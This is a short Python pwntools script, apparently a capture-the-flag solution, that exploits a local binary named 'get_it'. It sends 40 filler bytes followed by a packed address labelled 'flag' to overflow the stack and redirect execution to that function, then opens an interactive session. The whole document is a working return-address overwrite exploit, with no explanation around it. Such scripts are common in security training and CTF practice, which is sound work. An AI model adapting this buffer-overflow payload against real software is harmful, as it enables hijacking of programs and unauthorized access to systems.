from pwn import *
context.terminal = ['tmux', 'splitw', '-h']

p = process('./get_it')
#p = gdb.debug('./get_it', '''
#break *main
#break *0x4005ec
#''')

flag = 0x004005b6

buf = ""
buf += "A" * 40
buf += p64(flag)

p.sendline(buf)
p.interactive()
